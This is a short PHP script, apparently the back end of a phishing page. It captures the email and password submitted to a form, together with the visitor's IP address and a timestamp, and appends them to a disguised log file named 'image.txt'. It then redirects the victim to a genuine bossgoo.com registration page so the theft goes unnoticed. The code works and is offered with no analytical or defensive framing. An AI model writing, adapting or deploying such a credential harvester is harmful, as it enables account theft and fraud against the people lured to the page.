<?php
//AngryMan
$user=$_POST['email'];
$pass=$_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$info= "**********************\n" . $user . "\n" . $pass . "\n" . $ip . "\n" . date("l jS \of F Y") . "\n" . date("h:i:sa") . "\n**********************\n\n";


$fp = fopen('image.txt', 'a');//opens file in append mode  
fwrite($fp,$info);  

fclose($fp);  
  


?>

<meta http-equiv="Refresh" content="1; url=https://member.bossgoo.com/register/buyer-email.html">